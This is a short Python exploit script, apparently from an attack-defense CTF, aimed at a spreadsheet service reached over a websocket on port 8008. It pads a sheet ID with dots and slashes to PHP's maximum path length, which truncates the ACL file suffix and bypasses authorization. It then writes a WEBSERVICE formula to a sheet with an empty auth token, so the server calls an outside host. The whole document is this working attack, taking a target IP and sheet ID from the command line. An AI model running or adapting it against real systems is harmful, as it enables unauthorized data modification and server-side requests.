import json
import sys
from websockets.sync.client import connect

PHP_MAXPATHLEN = 4096
PREFIX = '/data/acls'
SUFFIX = '.modify'


def get_vzlom_id(s_id):
    t = PREFIX + '/' + s_id + SUFFIX
    to_fill = PHP_MAXPATHLEN - len(t) - 1
    middle_part = '.' + '/' * (to_fill - 1)
    return middle_part + s_id

def main(ip, sid):

    vzlom_id = get_vzlom_id(sid)
    with connect(f"ws://{ip}:8008/connection/websocket") as ws:
        payload = {
            "id": 1,
            "connect": {},
        }
        print(vzlom_id, len(vzlom_id))

        ws.send(json.dumps(payload))
        print(ws.recv())

        payload = {
            "id": 2,
            "rpc": {
                "method": "sheets.write",
                "data": {
                    "sheetId": vzlom_id,
                    "cell": 'A5',
                    "value": '=WEBSERVICE("https://yandex.ru")',
                    "authToken": '',
                }
            }
        }


        ws.send(json.dumps(payload))
        print(ws.recv())

if __name__ == '__main__':
    main(sys.argv[1], sys.argv[2])